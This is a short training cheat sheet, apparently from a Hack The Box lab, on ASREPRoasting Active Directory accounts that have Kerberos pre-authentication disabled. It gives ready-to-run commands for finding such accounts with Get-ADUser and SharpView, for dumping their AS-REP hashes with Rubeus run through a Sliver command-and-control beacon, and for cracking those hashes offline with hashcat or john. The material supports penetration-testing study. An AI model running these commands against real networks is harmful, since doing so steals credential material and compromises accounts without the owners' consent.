# 15.02 ASREPRoasting via Sliver

> AS-REP-roast `DoesNotRequirePreAuth` accounts via inline `Rubeus asreproast` from Sliver and crack `krb5asrep` offline.

## Overview

ASREPRoasting targets accounts with Kerberos Pre-Authentication disabled (DoesNotRequirePreAuth). Enumerate via PowerShell RSAT Get-ADUser or SharpView. Roast with inline Rubeus asreproast; crack the krb5asrep hash offline.

## Steps

- Enumerate ASREP-roastable users via Get-ADUser with RSAT (requires Install-WindowsFeature).
- Alternatively use SharpView: `execute-assembly SharpView.exe "get-netuser -PreauthNotRequired"`.
- Roast with `inline-execute-assembly Rubeus.exe 'asreproast /format:hashcat /user:<name> /nowrap'`.
- Crack resulting krb5asrep hash with hashcat -m 18200 or john.

## Commands

### Install RSAT AD PowerShell

```powershell
PS C:\Users\eric\Desktop> Install-WindowsFeature -Name RSAT-AD-PowerShell
```

### Enumerate pre-auth not required

```powershell
PS C:\Users\eric\Desktop> Get-ADUser -Filter { DoesNotRequirePreAuth -eq $true } -Properties DoesNotRequirePreAuth | select SamAccountName, DoesNotRequirePreAuth
```

### Rubeus asreproast inline

```text
sliver (http-beacon) > inline-execute-assembly /home/htb-ac590/Rubeus.exe 'asreproast /format:hashcat /user:bob /nowrap'
```

### SharpView enumerate pre-auth not required

```text
sliver (http-session) > execute-assembly /home/htb-ac590/SharpView.exe "get-netuser -PreauthNotRequired" -t 240 -i -E -M
```
